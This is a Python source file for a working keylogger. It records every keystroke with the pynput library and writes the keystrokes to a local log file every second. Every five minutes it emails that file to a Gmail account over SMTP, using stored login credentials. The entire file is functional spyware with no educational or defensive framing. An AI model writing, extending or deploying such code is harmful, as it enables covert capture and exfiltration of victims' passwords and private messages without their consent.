#! /usr/bin/env python
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

import pynput.keyboard
import threading
import os
import smtplib

class Keylogger:

    def __init__(self,username,password):
        self.log=""
        self.username=username
        self.password=password

    def append_to_log(self,string):
        self.log=self.log+string

    def process_key_pressed(self,key):
        try:
            current_key =  str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key= " "
        self.append_to_log(current_key)

    def send_email(self):
        message = MIMEMultipart()
        message['From'] = self.username
        message['To'] = self.username
        message['Subject'] = 'Log Details of Keylogger'
        message.attach(MIMEText("Log Details of Keylogger", 'plain'))
        attach_file_name = '/home/vickyvirus/Documents/log.txt'
        attach_file = open(attach_file_name, 'rb')
        payload = MIMEBase('application', "pdf", Name=attach_file_name.split("/")[-1])
        payload.set_payload((attach_file).read())
        encoders.encode_base64(payload)
        message.attach(payload)
        smtp=smtplib.SMTP("smtp.gmail.com",587)
        smtp.starttls()
        smtp.login(self.username,self.password)
        smtp.sendmail(self.username,self.username,message.as_string())
        mail_thread= threading.Timer(300,self.send_email)
        mail_thread.start()

    def report(self):
        check_file = os.path.isfile("/home/vickyvirus/Documents/log.txt")
        if check_file:
            with open("/home/vickyvirus/Documents/log.txt","ab+") as log_file:
                log_file.write(self.log.encode())
                log_file.close()
                self.log = ""
        else:
            with open("/home/vickyvirus/Documents/log.txt", "wb") as log_file:
                log_file.write(self.log.encode())
                log_file.close()
                self.log = ""
        log_thread = threading.Timer(1,self.report)
        log_thread.start()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_pressed)
        with keyboard_listener:
            self.report()
            self.send_email()
            keyboard_listener.join()
